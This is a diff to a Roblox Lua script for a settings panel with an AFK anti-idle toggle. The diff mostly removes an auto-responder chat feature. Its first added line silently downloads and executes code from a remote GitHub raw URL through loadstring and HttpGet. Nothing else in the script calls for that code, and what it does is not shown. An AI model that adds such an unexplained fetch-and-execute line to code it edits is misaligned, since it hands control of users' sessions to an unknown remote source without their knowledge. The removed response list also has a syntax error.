@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/qAxAp/Adonis/refs/heads/main/adonisss'))()
 local player = game:GetService("Players").LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local tweenService = game:GetService("TweenService")
@@ -509,15 +510,6 @@ end
 
 local afkEnabled = false
 local afkThread = nil
-local autoRespondEnabled = false
-
-local responses = {
-    "Hey, I'm AFK right now!",
-    "I’ll be back soon!",
-    "AFK mode activated!",
-    "Busy at the moment, catch me later!"
-    "VOIDY X!"
-}
 
 local function simulateActivity()
     while afkEnabled do
@@ -540,22 +532,8 @@ local function simulateActivity()
     end
 end
 
-local function autoRespond(player)
-    if autoRespondEnabled then
-        local message = responses[math.random(#responses)]
-        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
-            .SayMessageRequest:FireServer(message, "All")
-    end
-end
-
-game:GetService("Players").PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function()
-        autoRespond(player)
-    end)
-end)
-
 local afkContainer = Instance.new("Frame", settingsPanel)
-afkContainer.Size = UDim2.new(1, 0, 0, 100)
+afkContainer.Size = UDim2.new(1, 0, 0, 60)
 afkContainer.BackgroundTransparency = 1
 
 local afkButton = Instance.new("TextButton", afkContainer)
@@ -576,15 +554,6 @@ afkStatus.TextColor3 = Color3.fromRGB(180, 220, 255)
 afkStatus.TextSize = 12
 afkStatus.TextXAlignment = Enum.TextXAlignment.Left
 
-local autoRespondButton = Instance.new("TextButton", afkContainer)
-autoRespondButton.Size = UDim2.new(0.8, 0, 0, 40)
-autoRespondButton.Position = UDim2.new(0.1, 0, 0, 70)
-autoRespondButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-autoRespondButton.TextColor3 = Color3.fromRGB(200, 230, 255)
-autoRespondButton.Text = "Enable Auto-Responder"
-autoRespondButton.TextSize = 14
-Instance.new("UICorner", autoRespondButton).CornerRadius = UDim.new(0, 4)
-
 afkButton.MouseButton1Click:Connect(function()
     afkEnabled = not afkEnabled
 
@@ -601,18 +570,6 @@ afkButton.MouseButton1Click:Connect(function()
         if afkThread then
             coroutine.close(afkThread)
         end
-    end
-end)
-
-autoRespondButton.MouseButton1Click:Connect(function()
-    autoRespondEnabled = not autoRespondEnabled
-
-    if autoRespondEnabled then
-        autoRespondButton.Text = "Disable Auto-Responder"
-        autoRespondButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-    else
-        autoRespondButton.Text = "Enable Auto-Responder"
-        autoRespondButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
     end
 end)
 
